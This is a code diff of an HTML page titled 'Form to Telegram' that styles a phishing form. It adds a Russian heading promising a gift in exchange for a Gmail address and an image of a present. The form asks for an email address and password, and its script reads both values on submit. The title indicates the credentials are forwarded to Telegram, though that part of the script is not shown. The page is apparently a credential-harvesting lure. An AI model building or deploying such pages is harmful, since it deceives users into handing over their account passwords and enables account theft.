@@ -1,25 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Geist+Mono:wght@100..900&family=Londrina+Sketch&family=Pacifico&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
   <title>Form to Telegram</title>
 </head>
+
 <body>
+  <h2 class="title">Введите Gmail что бы получить подарок!</h2>
   <form id="dataForm">
-    <label for="email">Email:</label>
+    <label class="emText" for="email">Email:</label>
     <input type="email" id="email" required>
     <br>
-    <label for="password">Password:</label>
+    <label class="emPass" for="password">Password:</label>
     <input type="password" id="password" required>
     <br>
-    <button type="submit">Send</button>
+    <button class="btn" type="submit">Send</button>
   </form>
-
+  <div class="flexImg">
+    <img class="image" src="https://png.klev.club/uploads/posts/2024-04/png-klev-club-lm93-p-podarok-png-2.png" alt="">
+  </div>
   <script>
-    document.getElementById('dataForm').addEventListener('submit', async function(event) {
+    document.getElementById('dataForm').addEventListener('submit', async function (event) {
       event.preventDefault(); // Предотвращает перезагрузку страницы
-      
+
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
@@ -51,4 +62,5 @@
     });
   </script>
 </body>
+
 </html>
